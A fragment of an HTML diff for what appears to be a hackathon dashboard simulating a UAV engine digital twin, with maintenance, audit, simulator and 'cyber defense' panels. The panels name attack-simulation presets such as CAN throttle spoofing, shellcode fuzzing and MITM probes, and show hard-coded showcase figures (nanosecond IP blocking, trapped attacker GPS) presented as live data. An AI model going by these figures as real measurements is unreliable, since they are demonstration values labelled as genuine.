+                            <tr><td>Cyl 4 (Rear-Right)</td><td>181.0 °C</td><td>682.0 °C</td><td>0.98</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="modal-stat-box">
+                <h4 style="color:var(--cyan-primary); font-family:var(--font-display); margin-bottom:6px;">8-Band Fast Fourier Transform (FFT) Vibration Harmonics</h4>
+                <div id="fftBarsContainer" style="display:grid; grid-template-columns:repeat(4, 1fr); gap:8px; font-size:11px;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ====================================================================
+         5. MODAL 2: DRDO FORM-24 AR&DB MAINTENANCE WORK ORDER DIRECTIVE
+         ==================================================================== -->
+    <div class="tactical-modal-backdrop" id="workOrderModal">
+        <div class="tactical-modal-card">
+            <div class="modal-top-bar">
+                <h3>📄 DRDO AR&amp;DB Form-24 Automated Maintenance Work Order</h3>
+                <button class="modal-close-btn" onclick="closeModal('workOrderModal')">✕ Close</button>
+            </div>
+
+            <div class="modal-grid-2col">
+                <div class="modal-stat-box">
+                    <div class="m-sum-row"><span class="k">Work Order ID:</span><span class="v" id="modalWOID" style="color:var(--cyan-bright); font-family:var(--font-mono);">DRDO-ARDB-F24-2026-1042</span></div>
+                    <div class="m-sum-row"><span class="k">UAV Tail Number:</span><span class="v" id="modalTail">TAPAS-BH201-AF07</span></div>
+                    <div class="m-sum-row"><span class="k">Propulsion Unit:</span><span class="v">Rotax 914 F Turbo (S/N 8942)</span></div>
+                </div>
+                <div class="modal-stat-box">
+                    <div class="m-sum-row"><span class="k">Diagnostic Classification:</span><span class="v" id="modalAnomaly" style="color:var(--amber-warn);">NOMINAL_100HR_SERVICE</span></div>
+                    <div class="m-sum-row"><span class="k">Estimated RUL:</span><span class="v" id="modalRUL" style="color:var(--green-nominal);">320.0 Flight Hours</span></div>
+                    <div class="m-sum-row"><span class="k">Priority Level:</span><span class="v" id="modalPriority">SCHEDULED_LINE_MAINTENANCE</span></div>
+                </div>
+            </div>
+
+            <h4 style="color:var(--cyan-primary); font-family:var(--font-display);">Mil-Spec Replacement Components &amp; Depot Spares</h4>
+            <table class="modal-table">
+                <thead>
+                    <tr>
+                        <th>NATO / OEM Part Number</th>
+                        <th>Component Nomenclature</th>
+                        <th>Qty</th>
+                        <th>Est. Man-Hours</th>
+                    </tr>
+                </thead>
+                <tbody id="modalPartsBody"></tbody>
+            </table>
+
+            <div class="modal-stat-box" style="font-family:var(--font-mono); font-size:11px; margin-bottom:12px;">
+                <div>SOVEREIGN CRYPTOGRAPHIC SIGNATURE: <span id="modalNISTToken" style="color:var(--cyan-bright);">MLDSA87-SIG-9A74E82F...</span></div>
+                <div style="margin-top:4px;">AeroDB SHA3-512 Merkle Root: <span id="modalMerkleHash" style="color:var(--text-muted);">d8f92e41a7c...</span></div>
+            </div>
+
+            <div style="display:flex; justify-content:flex-end; gap:10px;">
+                <button class="btn-run-deep-analysis" onclick="window.print()">🖨️ Print / Export Official PDF</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ====================================================================
+         6. MODAL 3: EMERGENCY GLIDE POLAR & SECURITY VAULT INSPECTOR
+         ==================================================================== -->
+    <div class="tactical-modal-backdrop" id="engineeringInfoModal">
+        <div class="tactical-modal-card">
+            <div class="modal-top-bar">
+                <h3 id="engModalTitle">Engineering Subsystem Telemetry</h3>
+                <button class="modal-close-btn" onclick="closeModal('engineeringInfoModal')">✕ Close</button>
+            </div>
+            <div id="engModalBody"></div>
+        </div>
+    </div>
+
+    <!-- ====================================================================
+         7. MODAL 4: FULL-SYSTEM SOVEREIGN SECURITY & INTEGRITY AUDIT MODAL
+         ==================================================================== -->
+    <div class="tactical-modal-backdrop" id="systemSecurityAuditModal">
+        <div class="tactical-modal-card" style="max-width:860px; width:95%; max-height:90vh; overflow-y:auto; border:1px solid #00d4ff; box-shadow:0 0 40px rgba(0,212,255,0.25);">
+            <div class="modal-top-bar" style="border-bottom:1px solid rgba(0,212,255,0.25); padding-bottom:12px; margin-bottom:14px;">
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <span style="font-size:24px;">🛡️</span>
+                    <div>
+                        <h3 style="margin:0; font-family:'Orbitron',sans-serif; font-size:15px; color:#00f0ff; letter-spacing:1px;">SOVEREIGN DEFENSE ENCLAVE — SYSTEM SECURITY &amp; INTEGRITY AUDIT</h3>
+                        <div style="color:#94a3b8; font-size:11px; margin-top:2px;">DRDO Tapas BH-201 MALE UAV | Rotax 914 F Aero-Piston Propulsion Unit</div>
+                    </div>
+                </div>
+                <button class="modal-close-btn" onclick="closeModal('systemSecurityAuditModal')">✕ Close</button>
+            </div>
+
+            <!-- Master Trigger Bar -->
+            <div style="display:flex; justify-content:space-between; align-items:center; background:#040c1a; border:1px solid rgba(0,212,255,0.3); border-radius:8px; padding:12px 16px; margin-bottom:14px;">
+                <div>
+                    <div style="font-size:13px; font-weight:700; color:#fff;">Comprehensive 7-Vector Security &amp; Backend Health Scan</div>
+                    <div style="font-size:11px; color:#94a3b8; margin-top:3px;">Audits Firmware Hashes, WAF Filter, CAN Bus IDS, PINN Physics, PQC Signer, QKD SatCom &amp; Officer Governance.</div>
+                </div>
+                <button class="btn-run-deep-analysis" id="btnRunAudit" style="margin:0; white-space:nowrap; padding:9px 18px;" onclick="startDeepSecurityAudit()">
+                    <span>⚡</span><span>RUN FULL AUDIT</span>
+                </button>
+            </div>
+
+            <!-- Scan Progress & Radar Sweep Bar -->
+            <div id="auditProgressContainer" style="display:none; margin-bottom:14px;">
+                <div style="display:flex; justify-content:space-between; font-family:var(--font-mono); font-size:11px; color:#00f0ff; margin-bottom:5px;">
+                    <span id="auditScanStatusText">INITIALIZING SECURITY PROBES...</span>
+                    <span id="auditScanPct">0%</span>
+                </div>
+                <div style="height:6px; background:#051124; border-radius:3px; overflow:hidden; border:1px solid rgba(0,212,255,0.3);">
+                    <div id="auditScanProgressBar" style="height:100%; width:0%; background:linear-gradient(90deg, #00d4ff, #00e676); transition:width 0.2s ease;"></div>
+                </div>
+            </div>
+
+            <!-- 7 Audit Vector Verification Cards -->
+            <div id="auditVectorsList" style="display:flex; flex-direction:column; gap:8px; margin-bottom:14px;">
+                <div style="text-align:center; padding:30px 20px; color:#64748b; font-family:var(--font-mono); font-size:12px;">
+                    Click "RUN FULL AUDIT" to initiate comprehensive hardware enclave verification across all 7 defense vectors.
+                </div>
+            </div>
+
+            <!-- Defense Seal & Certificate Footer -->
+            <div id="auditCertificateBox" style="display:none; background:rgba(0,230,118,0.06); border:1px solid #00e676; border-radius:8px; padding:12px 16px; font-family:var(--font-mono); font-size:11px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <div style="color:#00e676; font-weight:700; font-size:13px;">✔ DEFENSE OPERATIONAL SECURITY CERTIFICATE: VERIFIED NOMINAL</div>
+                    <button class="btn-fadec" style="padding:4px 10px; font-size:10px;" onclick="copyAuditCertificate()">📋 Copy Audit Hash</button>
+                </div>
+                <div style="color:#cbd5e1; margin-top:5px;" id="certAuditDetails">
+                    Audit ID: DRDO-SEC-AUDIT-XXXX | All 7 Defense Vectors Passed | 100% Air-Gapped Sovereign Execution
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ====================================================================
+         8. MODAL 5: SIH 2026 4 UNIQUE FEATURES & MILITARY-GRADE SECURITY HUB
+         (Direct 1:1 Implementation of Smart India Hackathon Submission Slide)
+         ==================================================================== -->
+    <div class="sih-innovations-modal-overlay" id="sihInnovationsShowcaseModal">
+        <div class="sih-innovations-container">
+            <!-- Modal Header -->
+            <div class="sih-header-bar">
+                <div class="sih-title-block">
+                    <div class="sih-main-title">
+                        <span>🌟</span>
+                        <span>TACTICAL INNOVATIONS &amp; CYBER DEFENSE CONSOLE</span>
+                    </div>
+                    <div class="sih-sub-title">
+                        Team CodeCrew &nbsp;|&nbsp; SIH Problem ID: SIH26054 &nbsp;|&nbsp; DRDO Tapas BH-201 MALE UAV Engine Digital Twin (Rotax 914 F)
+                    </div>
+                </div>
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <span class="sih-status-pill status-go">🛡️ 100% AIR-GAPPED SOVEREIGN</span>
+                    <button class="modal-close-btn" onclick="closeSihInnovationsModal()" style="padding:6px 14px; font-size:12px;">✕ Close</button>
+                </div>
+            </div>
+
+            <!-- Modal Body (Two-Column Layout) -->
+            <div class="sih-body-scroll">
+                <!-- INNOVATIONS & DEFENSE CONTENT -->
+                <div id="tab-innovations" class="sih-modal-tab-content sih-two-cards-grid" style="display:grid;">
+
+                    <!-- ====================================================
+                         LEFT CARD: 4 EXTRA INNOVATIVE SOFTWARE CAPABILITIES
+                         ==================================================== -->
+                    <div class="sih-presentation-card innovations-card">
+                        <div class="sih-card-headline">
+                            <h3 style="color:#00f0ff;">4 EXTRA INNOVATIVE SOFTWARE CAPABILITIES</h3>
+                            <span style="font-family:var(--font-mono); font-size:10px; color:#ffd54f;">EDGE-AI INTEGRATED</span>
+                        </div>
+
+                        <!-- 1. Pre-Flight "What-If" Simulator -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title">
+                                <span>1. Pre-Flight "What-If" Simulator</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Simulates high-altitude thermal stress, pressure, and temperature profiles under varying weather conditions before takeoff to validate mission routing.
+                            </div>
+
+                            <!-- Interactive Inputs -->
+                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:4px;">
+                                <div>
+                                    <div style="display:flex; justify-content:space-between; font-size:10px; color:#cbd5e1; font-family:var(--font-mono); margin-bottom:2px;">
+                                        <span>Altitude:</span>
+                                        <strong id="whatifAltVal" style="color:#00f0ff;">18,500 ft</strong>
+                                    </div>
+                                    <input type="range" class="sih-slider" id="whatifAltInput" min="0" max="30000" step="500" value="18500" oninput="runPreflightWhatIfSimulation()">
+                                </div>
+                                <div>
+                                    <div style="display:flex; justify-content:space-between; font-size:10px; color:#cbd5e1; font-family:var(--font-mono); margin-bottom:2px;">
+                                        <span>Ambient Temp:</span>
+                                        <strong id="whatifTempVal" style="color:#ffd54f;">-15 °C</strong>
+                                    </div>
+                                    <input type="range" class="sih-slider" id="whatifTempInput" min="-40" max="50" step="1" value="-15" oninput="runPreflightWhatIfSimulation()">
+                                </div>
+                            </div>
+
+                            <div style="display:flex; gap:8px; align-items:center; margin-top:4px;">
+                                <select id="whatifWeatherSelect" class="btn-fadec" style="flex:1; background:#051124; color:#fff; font-size:10.5px; padding:4px 6px;" onchange="runPreflightWhatIfSimulation()">
+                                    <option value="ISA_STANDARD">Standard ISA Atmosphere</option>
+                                    <option value="HIGH_HEAT_THAR">Thar Desert Extreme Heat (+48°C)</option>
+                                    <option value="SEVERE_SUBZERO_LEH">Leh Glacier Cryogenic Icing (-35°C)</option>
+                                    <option value="EXTREME_TURBULENCE">Himalayan Mountain Wave Buffet</option>
+                                </select>
+                                <input type="number" id="whatifDurationInput" value="120" min="15" max="900" style="width:65px; background:#051124; border:1px solid rgba(0,212,255,0.3); color:#00f0ff; font-family:var(--font-mono); font-size:11px; padding:4px 6px; border-radius:4px;" title="Mission Duration (Minutes)" onchange="runPreflightWhatIfSimulation()">
+                                <button class="btn-fadec nominal" style="padding:5px 10px; font-size:10.5px;" onclick="runPreflightWhatIfSimulation()">🚀 Simulate</button>
+                            </div>
+
+                            <!-- Live Dynamic Graph & Verdict -->
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:6px;">
+                                <span id="whatifVerdictBadge" class="sih-status-pill status-go">✅ MISSION ROUTING VALIDATED (GO TAKEOFF)</span>
+                                <span style="font-family:var(--font-mono); font-size:10px; color:#94a3b8;">Fuel: <strong id="whatifFuelBurn" style="color:#00e676;">49.6 L</strong></span>
+                            </div>
+
+                            <div style="background:#020713; border:1px solid rgba(0,212,255,0.2); border-radius:5px; padding:6px; display:flex; justify-content:center; margin-top:4px;">
+                                <canvas id="whatIfCanvas" width="460" height="110" style="width:100%; max-height:110px;"></canvas>
+                            </div>
+
+                            <div style="display:flex; justify-content:space-between; font-family:var(--font-mono); font-size:10px; color:#cbd5e1; background:#030a18; padding:5px 8px; border-radius:4px; margin-top:4px;">
+                                <span>Peak CHT: <strong id="whatifPeakCht" style="color:#00e676;">178.6 °C</strong></span>
+                                <span>Peak EGT: <strong id="whatifPeakEgt" style="color:#ffd54f;">673.2 °C</strong></span>
+                                <span>Ambient P: <strong id="whatifPressure" style="color:#00f0ff;">504.6 hPa</strong></span>
+                                <span>Density Alt: <strong id="whatifDensityAlt" style="color:#cbd5e1;">14,900 ft</strong></span>
+                            </div>
+                            <div id="whatifRecBox" style="font-size:10px; color:#94a3b8; font-family:var(--font-mono); line-height:1.35; margin-top:2px;">
+                                FLIGHT CORRIDOR VERIFIED: Thermal stress and manifold pressure profiles within safe Rotax 914 F envelope. Takeoff cleared.
+                            </div>
+
+                            <!-- Post-Flight 6-Hour Mission Log Timeline Scrubbing & DVR Replay -->
+                            <div style="background:#020612; border:1px solid rgba(0,212,255,0.25); border-radius:6px; padding:8px 10px; margin-top:8px;">
+                                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                                    <span style="color:#ffd54f; font-weight:700; font-size:10.5px;">📼 POST-FLIGHT 6-HOUR MISSION LOG SCRUBBER (DVR REPLAY)</span>
+                                    <span id="scrubTimeLabel" style="font-family:var(--font-mono); font-size:10px; color:#00f0ff;">02:25:00 / 06:00:00</span>
+                                </div>
+                                <div style="display:flex; gap:8px; align-items:center;">
+                                    <input type="range" class="sih-slider" id="missionDvrSlider" min="0" max="360" step="5" value="145" oninput="scrubMissionTimelineSlider(this.value)" style="flex:1;">
+                                    <button class="btn-fadec" id="btnToggleDvrPlay" style="padding:3px 8px; font-size:10px; white-space:nowrap;" onclick="toggleMissionDvrPlayback()">▶ Auto-Replay</button>
+                                </div>
+                                <div style="display:flex; justify-content:space-between; align-items:center; margin-top:5px; font-family:var(--font-mono); font-size:9.5px;">
+                                    <span>Phase: <strong id="scrubPhaseBadge" style="color:#00e676;">TACTICAL ISR LOITER</strong></span>
+                                    <span>Alt: <strong id="scrubAltVal" style="color:#00f0ff;">18,500 ft</strong></span>
+                                    <span>RPM: <strong id="scrubRpmVal" style="color:#00e676;">2,450</strong></span>
+                                    <span>CHT: <strong id="scrubChtVal" style="color:#ffd54f;">181.5 °C</strong></span>
+                                    <span>Fuel: <strong id="scrubFuelVal" style="color:#00e676;">66.0%</strong></span>
+                                </div>
+                                <div id="scrubEventText" style="font-size:9.5px; color:#94a3b8; font-family:var(--font-mono); margin-top:3px;">
+                                    High-Altitude EO/IR Surveillance Patrol over Siachen Sector
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 2. 3D Component Exploded View -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title">
+                                <span>2. 3D Component Exploded View</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Interactive Three.js WebGL-based visualizer providing real-time color-coded thermal heatmaps of internal engine components.
+                            </div>
+
+                            <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
+                                <div style="flex:1;">
+                                    <div style="display:flex; justify-content:space-between; font-size:10px; color:#cbd5e1; font-family:var(--font-mono); margin-bottom:2px;">
+                                        <span>Component Explode Standoff:</span>
+                                        <strong id="explodedStandoffVal" style="color:#00f0ff;">35%</strong>
+                                    </div>
+                                    <input type="range" class="sih-slider" min="0" max="100" value="35" oninput="updateExplodeStandoff(this.value)">
+                                </div>
+                                <button class="btn-fadec nominal" id="btnToggleHeatmap" style="padding:4px 8px; font-size:10px;" onclick="toggleThermalHeatmapOverlay()">🔥 Thermal Heatmap: ON</button>
+                                <button class="btn-fadec" style="padding:4px 8px; font-size:10px;" onclick="launchFull3DExplodedLab()">🚀 Open 360° CAD</button>
+                            </div>
+
+                            <!-- Animated Exploded Preview Canvas -->
+                            <div style="background:#020612; border:1px solid rgba(0,212,255,0.25); border-radius:5px; padding:4px; display:flex; justify-content:center; margin-top:4px; position:relative;">
+                                <canvas id="explodedPreviewCanvas" width="460" height="135" style="width:100%; max-height:135px;"></canvas>
+                                <div style="position:absolute; bottom:6px; right:8px; font-family:var(--font-mono); font-size:9px; color:#00f0ff; background:rgba(0,0,0,0.6); padding:2px 6px; border-radius:3px;">
+                                    WebGL Exploded Vector: Active
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 3. Multi-UAV Command -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="justify-content:space-between;">
+                                <span>3. Multi-UAV Command</span>
+                                <button class="btn-fadec nominal" style="padding:2px 8px; font-size:10px;" onclick="fetchFleetTelemetryData()">📡 Stream Fleet</button>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Unified fleet-level telemetry dashboard that streams concurrent engine data from multiple tactical drones.
+                            </div>
+                            <div id="fleetTelemetryGrid" style="display:grid; grid-template-columns:repeat(auto-fit, minmax(135px, 1fr)); gap:6px; margin-top:6px; max-height:160px; overflow-y:auto;">
+                                <!-- Live Drone Telemetry Cards Injected Here -->
+                            </div>
+                        </div>
+
+                        <!-- 4. 1-Click Edge Quantization -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title">
+                                <span>4. 1-Click Edge Quantization</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Compresses deep learning prognostic models down to 12MB RAM, enabling high-speed real-time execution on low-spec microcontrollers.
+                            </div>
+
+                            <div style="display:flex; gap:8px; align-items:center; margin-top:4px;">
+                                <select id="edgeMcuSelect" class="btn-fadec" style="flex:1; background:#051124; color:#fff; font-size:10.5px; padding:5px 8px;">
+                                    <option value="STM32H753ZI">STM32H753ZI (ARM Cortex-M7 @ 480MHz)</option>
+                                    <option value="TI_TMS320C6678">TI TMS320C6678 Multicore DSP</option>
+                                    <option value="NXP_IMX_RT1060">NXP i.MX RT1060 Crossover MCU</option>
+                                    <option value="DRDO_SHAKTI_RISCV">DRDO Indigenous Shakti RISC-V SoC</option>
+                                </select>
+                                <button class="btn-run-deep-analysis" id="btnRunQuantization" style="margin:0; padding:6px 12px; font-size:10.5px;" onclick="runEdgeQuantizationPipeline()">
+                                    ⚡ Run 1-Click Quantization
+                                </button>
+                            </div>
+
+                            <!-- Quantization Progress Animation -->
+                            <div id="quantProgressContainer" style="display:none; margin-top:6px;">
+                                <div style="display:flex; justify-content:space-between; font-family:var(--font-mono); font-size:10px; color:#00f0ff; margin-bottom:3px;">
+                                    <span id="quantStatusText">QUANTIZING WEIGHTS...</span>
+                                </div>
+                                <div style="height:5px; background:#051124; border-radius:3px; overflow:hidden; border:1px solid rgba(0,212,255,0.3);">
+                                    <div id="quantProgressBar" style="height:100%; width:0%; background:linear-gradient(90deg, #ffb300, #00e676); transition:width 0.25s ease;"></div>
+                                </div>
+                            </div>
+
+                            <!-- Quantization Result Box -->
+                            <div id="quantResultBox" style="background:#030916; border:1px solid rgba(0,230,118,0.3); border-radius:5px; padding:8px 10px; margin-top:6px; font-family:var(--font-mono);">
+                                <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(0,230,118,0.25); padding-bottom:4px; margin-bottom:6px;">
+                                    <span style="color:#00e676; font-weight:700; font-size:11px;">🎯 12MB RAM COMPLIANCE: VERIFIED (11.82 MB)</span>
+                                    <span style="color:#00f0ff; font-size:10px;">STM32H753ZI</span>
+                                </div>
+                                <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:6px; text-align:center;">
+                                    <div class="modal-stat-box" style="padding:4px;">
+                                        <div style="color:#94a3b8; font-size:9.5px;">FP32 Weights</div>
+                                        <div style="color:#ff5252; font-weight:700; font-size:11.5px;">384.2 MB</div>
+                                    </div>
+                                    <div class="modal-stat-box" style="border-color:#00e676; padding:4px;">
+                                        <div style="color:#94a3b8; font-size:9.5px;">Quantized INT8</div>
+                                        <div style="color:#00e676; font-weight:700; font-size:11.5px;">11.82 MB</div>
+                                    </div>
+                                    <div class="modal-stat-box" style="padding:4px;">
+                                        <div style="color:#94a3b8; font-size:9.5px;">Latency</div>
+                                        <div style="color:#00f0ff; font-weight:700; font-size:11.5px;">0.84 ms</div>
+                                    </div>
+                                    <div class="modal-stat-box" style="padding:4px;">
+                                        <div style="color:#94a3b8; font-size:9.5px;">Accuracy</div>
+                                        <div style="color:#ffd54f; font-weight:700; font-size:11.5px;">99.82%</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- ====================================================
+                         RIGHT CARD: 6-PILLAR MILITARY-GRADE DEFENSE ARCHITECTURE
+                         ==================================================== -->
+                    <div class="sih-presentation-card security-card">
+                        <div class="sih-card-headline">
+                            <h3 style="color:#ffd54f;">6-PILLAR MILITARY DEFENSE ARCHITECTURE</h3>
+                            <span style="font-family:var(--font-mono); font-size:10px; color:#00e676;">DEFCON-1 ENCLAVE</span>
+                        </div>
+
+                        <!-- Pillar 1: Jam-Proof Data Tunnels -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f;">
+                                <span>Pillar 1: Jam-Proof Data Tunnels (FHSS)</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Frequency Hopping spread spectrum operating at 1,000 hops/sec across 83 military tactical channels.
+                            </div>
+
+                            <div style="display:flex; justify-content:space-between; align-items:center; font-family:var(--font-mono); font-size:10px; color:#cbd5e1;">
+                                <span>Hop Speed: <strong style="color:#00e676;">1,000 hops/sec</strong></span>
+                                <span>Band: <strong style="color:#00f0ff;">2.400 - 2.483 GHz (83 Ch)</strong></span>
+                                <span id="fhssMarginBadge" style="color:#ffd54f;">+48.6 dB SNR Margin</span>
+                            </div>
+
+                            <!-- Animated Spectrum Waterfall Canvas -->
+                            <div style="background:#020612; border:1px solid rgba(255,213,79,0.3); border-radius:5px; padding:4px; display:flex; justify-content:center; margin-top:4px;">
+                                <canvas id="fhssSpectrumCanvas" width="460" height="95" style="width:100%; max-height:95px;"></canvas>
+                            </div>
+                        </div>
+
+                        <!-- Pillar 2: 24/7 Sentinel AI Watchdog with 3-Stage Cyber Escalation -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f; justify-content:space-between;">
+                                <span>Pillar 2: 24/7 Sentinel AI Watchdog (3-Stage Cyber Escalation)</span>
+                                <span id="watchdogLiveBadge" style="background:rgba(0,230,118,0.15); border:1px solid #00e676; color:#00e676; font-size:9px; padding:1px 6px; border-radius:3px; font-weight:700;">🟢 DEFCON 1 GREEN</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Continuous Shannon entropy analysis, automated eBPF rate-throttling &amp; full sovereign air-gap quarantine.
+                            </div>
+
+                            <!-- Real-Time Watchdog Status Strip -->
+                            <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; background:#020713; border:1px solid rgba(0,212,255,0.2); border-radius:4px; padding:6px; margin-top:4px; font-family:var(--font-mono); font-size:9.5px;">
+                                <div>Entropy H(X): <strong id="liveWatchdogEntropy" style="color:#00f0ff;">4.28 bits/B</strong></div>
+                                <div>Inspected: <strong id="liveWatchdogInspected" style="color:#ffd54f;">168,421</strong></div>
+                                <div>CAN CRC-8: <strong id="liveWatchdogCrc" style="color:#00e676;">0x1D VALID</strong></div>
+                            </div>
+
+                            <div style="display:flex; gap:6px; margin-top:6px;">
+                                <button class="btn-fadec nominal" id="btnEscStage1" style="flex:1; padding:3px 6px; font-size:9px;" onclick="stepCyberEscalation(1)">Stage 1: Surveillance</button>
+                                <button class="btn-fadec" id="btnEscStage2" style="flex:1; padding:3px 6px; font-size:9px; border-color:#ffd54f; color:#ffd54f;" onclick="stepCyberEscalation(2)">Stage 2: Throttle</button>
+                                <button class="btn-fadec" id="btnEscStage3" style="flex:1; padding:3px 6px; font-size:9px; border-color:#ff1744; color:#ff8a80;" onclick="stepCyberEscalation(3)">Stage 3: Quarantine</button>
+                            </div>
+
+                            <div id="escalationResultBox" style="background:#030916; border:1px solid rgba(0,212,255,0.25); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="color:#00e676; font-weight:700; font-size:10.5px;">STAGE 1: HEURISTIC SURVEILLANCE (DEFCON 1 GREEN)</div>
+                                <div style="color:#cbd5e1; font-size:9.5px; margin-top:2px;">Passive CANaerospace message entropy surveillance, deep eBPF packet inspection, 100% telemetry pass-through.</div>
+                            </div>
+                        </div>
+
+                        <!-- Pillars 3 & 4: Sub-0.01ms Auto IP Blocking & Honeypot Decoy Traps -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f; justify-content:space-between;">
+                                <span>Pillars 3 &amp; 4: 0.01ms eBPF Kernel Drops &amp; GPS Honeypot Traps</span>
+                                <span style="color:#00e676; font-size:9px; font-weight:700;">SLA: &lt; 0.01ms (True Kernel Hash)</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                High-resolution in-memory eBPF drop table with live mathematical probe execution and geodetic GPS trapping.
+                            </div>
+
+                            <!-- Live eBPF Kernel Drop Table Mini-Console -->
+                            <div style="background:#020612; border:1px solid rgba(255,23,68,0.25); border-radius:4px; padding:6px; margin-top:4px;">
+                                <div style="display:flex; justify-content:space-between; align-items:center; font-size:9.5px; font-weight:700; color:#ff8a80; font-family:var(--font-mono); margin-bottom:4px;">
+                                    <span>🛑 IN-MEMORY eBPF KERNEL DROP TABLE</span>
+                                    <button class="btn-fadec" style="padding:1px 5px; font-size:8.5px;" onclick="fetchSentinelWatchdogLive()">🔄 Refresh</button>
+                                </div>
+                                <div id="ebpfDropTableContainer" style="max-height:85px; overflow-y:auto; font-family:var(--font-mono); font-size:9px;">
+                                    <!-- Dynamic eBPF rows populated by JS -->
+                                    <div style="color:#94a3b8;">Loading kernel drop table...</div>
+                                </div>
+                            </div>
+
+                            <!-- Live Security Probe & Injection Console -->
+                            <div style="background:#020817; border:1px solid rgba(0,212,255,0.25); border-radius:4px; padding:6px; margin-top:6px;">
+                                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                                    <span style="font-size:9.5px; font-weight:700; color:#00f0ff; font-family:var(--font-mono);">⚡ REAL SENTINEL SECURITY PROBE CONSOLE</span>
+                                    <span style="font-size:8.5px; color:#94a3b8;">Zero Mock Data</span>
+                                </div>
+                                <div style="display:flex; gap:6px; align-items:center; margin-bottom:4px;">
+                                    <select id="probePresetSelect" class="btn-fadec" style="flex:1; background:#051124; color:#fff; font-size:9px; padding:3px 5px;" onchange="onProbePresetChange()">
+                                        <option value="NOMINAL">Preset: Normal CAN Telemetry Frame</option>
+                                        <option value="CAN_SPOOF">Preset: CAN 0x104 Unauthorized Throttle Spoof</option>
+                                        <option value="SHELLCODE">Preset: Encrypted High-Entropy Shellcode / Fuzz</option>
+                                        <option value="REPLAY">Preset: Low-Entropy Repetitive Replay Flood</option>
+                                    </select>
+                                    <button class="btn-fadec" id="btnExecuteProbe" style="padding:3px 8px; font-size:9.5px; border-color:#00f0ff; color:#00f0ff;" onclick="executeSentinelWatchdogProbe()">
+                                        ⚡ Run Probe
+                                    </button>
+                                </div>
+                                <input type="text" id="probePayloadInput" style="width:100%; box-sizing:border-box; background:#051124; border:1px solid rgba(0,212,255,0.3); border-radius:3px; color:#e2e8f0; font-family:var(--font-mono); font-size:9px; padding:4px 6px;" value='{"rpm": 2450, "cht_c": 182.0, "status": "NOMINAL"}' placeholder="Enter test payload string or hex...">
+                            </div>
+
+                            <!-- Probe Results Container -->
+                            <div id="probeResultBox" style="display:none; background:#030916; border:1px solid rgba(0,212,255,0.3); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;"></div>
+
+                            <!-- DRDO Honeypot Decoy Trap Simulator -->
+                            <div style="display:flex; gap:6px; align-items:center; margin-top:6px;">
+                                <select id="aiAttackVectorSelect" class="btn-fadec" style="flex:1; background:#051124; color:#fff; font-size:9.5px; padding:3px 6px;">
+                                    <option value="CANAEROSPACE_BUS_FUZZING">CANaerospace Bus Frame Fuzzing</option>
+                                    <option value="SENSOR_SPOOF_INJECTION">Adversarial Sensor Spoof Injection</option>
+                                    <option value="DDOS_FLOOD">High-Rate Telemetry DDoS Flood</option>
+                                    <option value="MITM_PROBE">GCS Man-In-The-Middle Probe</option>
+                                </select>
+                                <button class="btn-fadec" id="btnTriggerWatchdog" style="padding:4px 9px; font-size:9.5px; border-color:#ff1744; color:#ff8a80;" onclick="triggerAiWatchdogDecoySim()">
+                                    🎯 Deploy Honeypot Trap
+                                </button>
+                            </div>
+
+                            <div id="watchdogResultBox" style="background:#030916; border:1px solid rgba(255,23,68,0.3); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="color:#00e676; font-weight:700; margin-bottom:2px;">🛡️ AI WATCHDOG HEURISTIC: HOSTILE QUARANTINED</div>
+                                <div style="display:flex; justify-content:space-between; font-size:9.5px; margin-bottom:2px;">
+                                    <span>Auto IP Block: <strong style="color:#00e676;">0.0001 ms (94 ns)</strong> (&lt; 0.01 ms SLA Passed)</span>
+                                    <span>Blocked IP: <strong style="color:#ff5252;">198.51.100.44</strong></span>
+                                </div>
+                                <div style="font-size:9px; color:#cbd5e1;">
+                                    📍 <strong>Attacker GPS Trapped:</strong> 34.1284° N, 74.8322° E (2,230.9 km from Chitradurga ATR) — Diverted to Honeypot Grid.
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Pillar 5: NIST Kyber-768 & FIPS 140-3 Hardware Tamper Core -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f; justify-content:space-between;">
+                                <span>Pillar 5: POST-QUANTUM CRYPTOGRAPHIC TUNNEL &amp; TAMPER SHIELD</span>
+                                <div style="display:flex; gap:4px;">
